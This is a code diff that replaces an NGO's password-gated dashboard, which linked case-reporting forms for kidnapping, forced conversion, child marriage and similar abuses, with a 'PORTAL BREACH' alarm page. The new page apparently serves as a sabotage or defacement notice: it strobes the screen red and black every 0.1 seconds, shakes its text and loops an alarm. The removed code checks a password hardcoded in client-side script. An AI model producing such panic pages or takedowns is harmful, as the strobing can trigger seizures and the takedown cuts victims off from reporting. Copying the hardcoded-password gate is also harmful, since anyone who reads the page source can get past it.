@@ -1,400 +1,171 @@
 <!DOCTYPE html>
 <html lang="en">
-
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>NGO - Justice for All</title>
-    <script src="https://cdn.tailwindcss.com"></script>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/flowbite/1.6.3/flowbite.min.js"></script>
-    <link rel="icon" type="image/png" href="Adobe Express - file (1) (1).png">
-    <script src="https://cdn.tailwindcss.com"></script>
-    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
-    <link rel="stylesheet" href="styles.css">
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" />
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css">
-    <link rel="icon" type="image/png" href="Adobe Express - file (1) (1).png">
-    <script src="https://cdn.tailwindcss.com"></script>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" />
-    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
-    <script src="nav-script.js"></script>
-    <link rel="stylesheet" href="nav.css">
-    <style>
-        @import url('https://fonts.googleapis.com/css2?family=Roboto:ital,wght@0,100..900;1,100..900&display=swap');
-        @import url('https://fonts.googleapis.com/css2?family=Roboto+Condensed:ital,wght@0,100..900;1,100..900&family=Roboto:ital,wght@0,100..900;1,100..900&display=swap');
-        footer{
-            display: flex;
-            flex-direction: row;
-            justify-content: center;
-            align-items: center;
-        }
-        .f-text{
-            color: blue;
-            font-family: "Roboto", sans-serif;
-            font-size: 15px;
-        }
-        @media (max-width: 640px) {
+<meta charset="UTF-8" />
+<title>🚨 ULTRA HIGH ALERT - PANIC MODE</title>
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<style>
+  /* Background flicker - very fast violent red/black flashing */
+  @keyframes violentFlash {
+    0%, 50%, 100% { background-color: black; }
+    25%, 75% { background-color: #8B0000; }
+  }
 
-            .filter-container {
-                flex-direction: column;
-                align-items: center;
-            }
+  /* Jitter effect on container - constant subtle shake */
+  @keyframes jitter {
+    0% { transform: translate(0, 0); }
+    10% { transform: translate(-3px, 2px) rotate(-1deg); }
+    20% { transform: translate(3px, -2px) rotate(1deg); }
+    30% { transform: translate(-2px, 3px) rotate(-1.5deg); }
+    40% { transform: translate(2px, -3px) rotate(1.5deg); }
+    50% { transform: translate(-3px, 2px) rotate(-1deg); }
+    60% { transform: translate(3px, -2px) rotate(1deg); }
+    70% { transform: translate(-2px, 3px) rotate(-1.5deg); }
+    80% { transform: translate(2px, -3px) rotate(1.5deg); }
+    90% { transform: translate(-3px, 2px) rotate(-1deg); }
+    100% { transform: translate(0, 0); }
+  }
 
-            .filter-container select,
-            .filter-container input,
-            .filter-container button {
-                width: 100%;
-                max-width: 300px;
-            }
+  /* Fast blinking */
+  @keyframes fastBlink {
+    0%, 100% { opacity: 1; }
+    50% { opacity: 0; }
+  }
 
-            .responsive-name {
-                font-size: 1.20rem !important;
-            }
-        }
+  /* Very fast pulse */
+  @keyframes rapidPulse {
+    0% { transform: scale(1); }
+    50% { transform: scale(1.1); }
+    100% { transform: scale(1); }
+  }
 
-        body {
-            
-            /* background-size: cover; */
-            color: white;
-            font-family: 'Inter', sans-serif;
-            position: relative;
-        }
+  /* Repeated “DANGER” watermark */
+  body::before {
+    content: "DANGER DANGER DANGER ";
+    position: fixed;
+    top: 50%; left: 50%;
+    transform: translate(-50%, -50%) rotate(-45deg);
+    font-size: 15vw;
+    font-weight: 900;
+    color: rgba(255, 0, 0, 0.05);
+    white-space: nowrap;
+    pointer-events: none;
+    user-select: none;
+    animation: fastBlink 1s infinite;
+    z-index: 0;
+  }
 
-        body::before {
-            content: "";
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            /* background: rgba(20, 30, 48, 0.8); Dark overlay to improve text readability */
-            z-index: -1;
-        }
+  html, body {
+    margin: 0; padding: 0;
+    height: 100%;
+    background-color: black;
+    animation: violentFlash 0.1s infinite;
+    overflow: hidden;
+    cursor: pointer;
+    font-family: 'Arial Black', Impact, sans-serif;
+  }
 
-        body::before {
-            content: "";
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            /* background: rgba(20, 30, 48, 0.8); Dark overlay */
-            z-index: -1;
-        }
-
-        /* Glassmorphism Effect */
-        .glass {
-            background: rgba(255, 255, 255, 0.1);
-            backdrop-filter: blur(10px);
-            -webkit-backdrop-filter: blur(10px);
-            border-radius: 12px;
-            padding: 20px;
-            box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.2);
-            animation: fadeIn 0.6s ease-in-out;
-        }
-
-        @keyframes fadeIn {
-            from {
-                opacity: 0;
-                transform: translateY(-20px);
-            }
-
-            to {
-                opacity: 1;
-                transform: translateY(0);
-            }
-        }
-
-        .text-2s {
-            text-align: left;
-            color: blue;
-        }
-@keyframes fadeInDown {
-    from {
-        opacity: 0;
-        transform: translateY(-30px);
-    }
-    to {
-        opacity: 1;
-        transform: translateY(0);
-    }
-}
-@keyframes fadeInUp {
-    from {
-        opacity: 0;
-        transform: translateY(30px);
-    }
-    to {
-        opacity: 1;
-        transform: translateY(0);
-    }
-}
-@keyframes slideIn {
-    from {
-        opacity: 0;
-        transform: translateY(50px);
-    }
-    to {
-        opacity: 1;
-        transform: translateY(0);
-    }
-}
-.animate-fadeInDown {
-    animation: fadeInDown 1s ease forwards;
-}
-.animate-fadeInUp {
-    animation: fadeInUp 1s ease forwards;
-}
-.animate-slideIn {
-    animation: slideIn 0.8s ease forwards;
-}
-.delay-100 {
-    animation-delay: 0.1s;
-}
-.delay-200 {
-    animation-delay: 0.2s;
-}
-.delay-300 {
-    animation-delay: 0.3s;
-}
-.delay-400 {
-    animation-delay: 0.4s;
-}
-.delay-500 {
-    animation-delay: 0.5s;
-}
-.delay-600 {
-    animation-delay: 0.6s;
-}
-.delay-700 {
-    animation-delay: 0.7s;
-}
-
-.h-text{
-    font-size: 35px;
-    font-family: "Roboto", sans-serif;
-  font-optical-sizing: auto;
-  font-weight: 400;
-  font-style: normal;
-  font-variation-settings: "wdth" 100;
-  color: #4F46E5;
-  
-
-}
-.h-text-main{
+  .container {
+    position: relative;
+    height: 100%;
     display: flex;
+    flex-direction: column;
     justify-content: center;
     align-items: center;
-    width: 100%;
-}
-.bg-33{
-    background: url("background.jpg") no-repeat center center fixed;
-   
-    
-}
-.bg-33::before{
-    content: "";
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(20, 30, 48, 0.527);
-            z-index: -1;
-}
-    </style>
+    color: white;
+    text-align: center;
+    animation: jitter 0.15s infinite;
+    z-index: 1;
+  }
+
+  .emoji {
+    font-size: 15vw;
+    animation: fastBlink 0.3s infinite;
+    user-select: none;
+  }
+
+  h1 {
+    font-size: 12vw;
+    color: #FF0000;
+    text-shadow:
+      0 0 10px white,
+      0 0 20px red,
+      0 0 40px #FF0000,
+      0 0 60px #FF0000;
+    margin: 0.1em 0;
+    animation: rapidPulse 0.2s infinite;
+    user-select: none;
+  }
+
+  .alert-text {
+    font-size: 7vw;
+    font-weight: 900;
+    color: yellow;
+    text-shadow: 0 0 15px red;
+    animation: fastBlink 0.15s infinite;
+    user-select: none;
+    margin: 0.1em 0;
+  }
+
+  .contact {
+    font-size: 5vw;
+    margin-top: 25px;
+    color: lime;
+    font-weight: bold;
+    text-shadow: 0 0 10px white;
+    animation: fastBlink 1s infinite;
+    user-select: none;
+  }
+
+  .click-prompt {
+    margin-top: 40px;
+    font-size: 4vw;
+    font-weight: 900;
+    color: #FF0000;
+    text-shadow: 0 0 10px white;
+    animation: fastBlink 0.3s infinite;
+    user-select: none;
+  }
+
+  @media (min-width: 768px) {
+    h1 { font-size: 7em; }
+    .alert-text { font-size: 3em; }
+    .contact { font-size: 2em; }
+    .emoji { font-size: 6em; }
+    .click-prompt { font-size: 1.5em; }
+  }
+</style>
 </head>
+<body>
+  <div class="container" id="container">
+    <div class="emoji">💀🚨💣</div>
+    <h1>PORTAL BREACH</h1>
+    <div class="alert-text">⚠️ ULTRA HIGH ALERT ⚠️</div>
+    <div class="alert-text">PAKISTAN DARAWAR ITEHAD SHUTDOWN</div>
+    <div class="contact">Contact Engineer: <strong>MOHAMMAD AHMED</strong></div>
+    <div class="click-prompt" id="clickPrompt">CLICK ANYWHERE TO START ALERT SOUND</div>
+  </div>
 
-<body class=" text-white">
+  <audio id="alertSound" loop>
+    <source src="https://actions.google.com/sounds/v1/alarms/alarm_clock.ogg" type="audio/ogg" />
+    <source src="https://actions.google.com/sounds/v1/alarms/alarm_clock.mp3" type="audio/mpeg" />
+  </audio>
 
+  <script>
+    const sound = document.getElementById('alertSound');
+    const container = document.getElementById('container');
+    const clickPrompt = document.getElementById('clickPrompt');
 
-    <div id="passwordModal" class="fixed inset-0 flex items-center justify-center bg-black bg-opacity-80 z-50 bg-33" >
-        <div class="glass w-96 text-center p-6 text-white border border-gray-300 shadow-lg ">
-            <img src="Adobe Express - file (1) (1).png" alt="NGO Logo" class="w-20 mx-auto mb-3 rounded-full">
-            
-            <h2 class="text-2xl font-bold mb-4">Enter Password</h2>
-            <input type="password" id="passwordInput"
-                class="border p-3 w-full rounded-lg text-center bg-transparent text-white placeholder-gray-300 border-gray-400"
-                placeholder="Enter password">
-            <button onclick="checkPassword()"
-                class="mt-4 bg-blue-500 text-white px-5 py-2 rounded-lg w-full hover:bg-blue-600 transition-all">Unlock</button>
-            <p id="errorText" class="text-red-500 mt-2 hidden">Incorrect Password!</p>
-        </div>
-    </div>
-    <div id="mainContent" class="hidden">
+    function startAlert() {
+      sound.volume = 1.0;
+      sound.play().catch(() => {
+        console.warn("Sound play blocked, user interaction required.");
+      });
+      container.removeEventListener('click', startAlert);
+      clickPrompt.style.display = 'none';
+    }
 
-
-
-        <div class="dashboard">
-            <div class="dashboard-nav">
-                <header>
-                    <a href="#!" class="menu-toggle">
-                        <i class="fas fa-bars"></i>
-                    </a>
-                    <a href="#" class="brand-logo">
-                        <img src="Adobe Express - file (1) (1).png" alt="logo" height="80" width="80">
-                    </a>
-                    
-                </header>
-                <nav class="dashboard-nav-list">
-                    <a href="index.html" class="dashboard-nav-item">
-                        <i class="fas fa-home"></i> Home
-                    </a>
-                    <a href="dashboard.html" class="dashboard-nav-item ">
-                        <i class="fas fa-tachometer-alt"></i> Dashboard
-                    </a>
-                    <a href="stats.html" class="dashboard-nav-item">
-                        <i class="fas fa-chart-line"></i> Stats
-                    </a>
-                    <a href="attendance.html" class="dashboard-nav-item">
-                        <i class="fas fa-clipboard-check"></i> Attendance
-                    </a>
-                    <a href="sheet.html" class="dashboard-nav-item">
-                        <i class="fas fa-file-excel"></i> Sheet
-                    </a>
-                    <a href="user-guide.html" class="dashboard-nav-item">
-                        <i class="fas fa-book"></i> User Guide
-                    </a>
-                    <div class="nav-item-divider"></div>
-                    <a href="index.html" class="dashboard-nav-item">
-                        <i class="fas fa-sign-out-alt"></i> Logout
-                    </a>
-                </nav>
-            </div>
-        
-            <div class="dashboard-app">
-                <header class="dashboard-toolbar d-n">
-                    <a href="#!" class="menu-toggle">
-                        <i class="fas fa-bars"></i>
-                    </a>
-                    
-                    
-                </header>
-        
-                <div class="dashboard-content">
-                    <div class="container">
-                        <div class="card">
-                            <div class="card-header text-center py-6 bg-gradient-to-r from-indigo-500 via-purple-500 to-pink-500 text-white rounded-t-2xl shadow-lg animate-fadeInDown">
-                                <h1 class="text-4xl font-bold">Welcome back, Social Worker!</h1>
-                            </div>
-                            
-                            <div class="card-body bg-gray-100 p-10 rounded-b-2xl shadow-xl animate-fadeInUp">
-                                <section id="issues" class="text-center">
-                                    <h2 class="text-5xl font-extrabold mb-10 text-gray-800 animate-pulse">All Forms</h2>
-                            
-                                    <div class="grid grid-cols-1 sm:grid-cols-2 md:grid-cols-3 gap-8">
-                                        <!-- Card Template Start -->
-                                        <div class="bg-white rounded-3xl overflow-hidden shadow-md transform hover:scale-105 transition-transform duration-500 animate-slideIn">
-                                            <img src="KIDNAP.jpg" class="w-full h-48 object-cover" alt="Kidnap">
-                                            <div class="p-5">
-                                                <a href="https://docs.google.com/forms/d/e/1FAIpQLSdCmPLQS_cUkVzOw-ejtxVXXwoP6YRmea_dtCLTF4WQZ854kA/viewform?usp=header"
-                                                    class="inline-block mt-4 bg-red-500 hover:bg-red-600 px-6 py-3 rounded-full text-white font-semibold shadow transition-colors duration-300">
-                                                    Kidnap Report
-                                                </a>
-                                            </div>
-                                        </div>
-                                        <!-- Repeat for other cards -->
-                                        <div class="bg-white rounded-3xl overflow-hidden shadow-md transform hover:scale-105 transition-transform duration-500 animate-slideIn delay-100">
-                                            <img src="Force conversion.webp" class="w-full h-48 object-cover" alt="Forced Conversion">
-                                            <div class="p-5">
-                                                <a href="https://docs.google.com/forms/d/e/1FAIpQLSeL9Z24-llAWnTTRqB-GIm5OlsMG00w6WG-G2yrTykDXlFbcQ/viewform?usp=header"
-                                                    class="inline-block mt-4 bg-red-500 hover:bg-red-600 px-6 py-3 rounded-full text-white font-semibold shadow transition-colors duration-300">
-                                                    Force Conversion Report
-                                                </a>
-                                            </div>
-                                        </div>
-                            
-                                        <div class="bg-white rounded-3xl overflow-hidden shadow-md transform hover:scale-105 transition-transform duration-500 animate-slideIn delay-200">
-                                            <img src="sucide.webp" class="w-full h-48 object-cover" alt="Suicide">
-                                            <div class="p-5">
-                                                <a href="https://docs.google.com/forms/d/e/1FAIpQLSfsljgM-9ELu6mmgrmlWBcaiKElk4tM_DR9bmQZxjav1Juq5Q/viewform?usp=header"
-                                                    class="inline-block mt-4 bg-red-500 hover:bg-red-600 px-6 py-3 rounded-full text-white font-semibold shadow transition-colors duration-300">
-                                                    Suicide Case Report
-                                                </a>
-                                            </div>
-                                        </div>
-                            
-                                        <div class="bg-white rounded-3xl overflow-hidden shadow-md transform hover:scale-105 transition-transform duration-500 animate-slideIn delay-300">
-                                            <img src="Murder.webp" class="w-full h-48 object-cover" alt="Murder">
-                                            <div class="p-5">
-                                                <a href="https://docs.google.com/forms/d/e/1FAIpQLSc5_A_CFsv2ACrRFCjvh_0YqMOJVxQCQ8dU_i8qMP5KpimhJA/viewform?usp=header"
-                                                    class="inline-block mt-4 bg-red-500 hover:bg-red-600 px-6 py-3 rounded-full text-white font-semibold shadow transition-colors duration-300">
-                                                    Murder Report
-                                                </a>
-                                            </div>
-                                        </div>
-                            
-                                        <div class="bg-white rounded-3xl overflow-hidden shadow-md transform hover:scale-105 transition-transform duration-500 animate-slideIn delay-400">
-                                            <img src="child marrige.webp" class="w-full h-48 object-cover" alt="Child Marriage">
-                                            <div class="p-5">
-                                                <a href="https://docs.google.com/forms/d/e/1FAIpQLSdy7wyCltersWtRDcUioanZvvJ77XXN6bb_FoR7J6v15NWYWw/viewform?usp=header"
-                                                    class="inline-block mt-4 bg-red-500 hover:bg-red-600 px-6 py-3 rounded-full text-white font-semibold shadow transition-colors duration-300">
-                                                    Child Marriage Report
-                                                </a>
-                                            </div>
-                                        </div>
-                            
-                                        <div class="bg-white rounded-3xl overflow-hidden shadow-md transform hover:scale-105 transition-transform duration-500 animate-slideIn delay-500">
-                                            <img src="LAND GRABBER.webp" class="w-full h-48 object-cover" alt="Land Grabber">
-                                            <div class="p-5">
-                                                <a href="https://docs.google.com/forms/d/e/1FAIpQLSc9CcozDXyykhjVLvODubvvFe6LyaECBbmlZa-4-u65gGpxDw/viewform?usp=header"
-                                                    class="inline-block mt-4 bg-red-500 hover:bg-red-600 px-6 py-3 rounded-full text-white font-semibold shadow transition-colors duration-300">
-                                                    Land Grabber Report
-                                                </a>
-                                            </div>
-                                        </div>
-                            
-                                        <div class="bg-white rounded-3xl overflow-hidden shadow-md transform hover:scale-105 transition-transform duration-500 animate-slideIn delay-600">
-                                            <img src="protest.webp" class="w-full h-48 object-cover" alt="Protest">
-                                            <div class="p-5">
-                                                <a href="https://docs.google.com/forms/d/e/1FAIpQLSeoGXeOH-rLfZzX-imvyBcwZKTBufsdo7_307T7HpKyBKxnVQ/viewform?usp=sharing"
-                                                    class="inline-block mt-4 bg-red-500 hover:bg-red-600 px-6 py-3 rounded-full text-white font-semibold shadow transition-colors duration-300">
-                                                    Protest Report
-                                                </a>
-                                            </div>
-                                        </div>
-                            
-                                        <div class="bg-white rounded-3xl overflow-hidden shadow-md transform hover:scale-105 transition-transform duration-500 animate-slideIn delay-700">
-                                            <img src="others.webp" class="w-full h-48 object-cover" alt="Others">
-                                            <div class="p-5">
-                                                <a href="https://docs.google.com/forms/d/e/1FAIpQLSdkv9rE3QNqhQpbAGAwaixrz-8ISrz1zjyJv9NceggyGKFixA/viewform?usp=header"
-                                                    class="inline-block mt-4 bg-red-500 hover:bg-red-600 px-6 py-3 rounded-full text-white font-semibold shadow transition-colors duration-300">
-                                                    Other Problem Report
-                                                </a>
-                                            </div>
-                                        </div>
-                                    </div>
-                                </section>
-                            </div>
-                            
-                        </div>
-                    </div>
-                </div>
-            </div>
-        </div>
-
-
-        <!-- Issues Section -->
-
-
-       <footer>
-            <p class="f-text">ALL CREDITS PAKISTAN DARAWAR ITEHAD TEAM &#64;2025</p>
-       </footer>
-    </div>
-    <script>
-        function checkPassword() {
-            var password = "2025"; // Set your password
-            var input = document.getElementById("passwordInput").value;
-            if (input === password) {
-                document.getElementById("passwordModal").style.display = "none";
-                document.getElementById("mainContent").classList.remove("hidden");
-            } else {
-                document.getElementById("errorText").classList.remove("hidden");
-            }
-        }
-    </script>
-
+    container.addEventListener('click', startAlert);
+  </script>
 </body>
-<script src="nav-script.js"></script>
-
 </html>
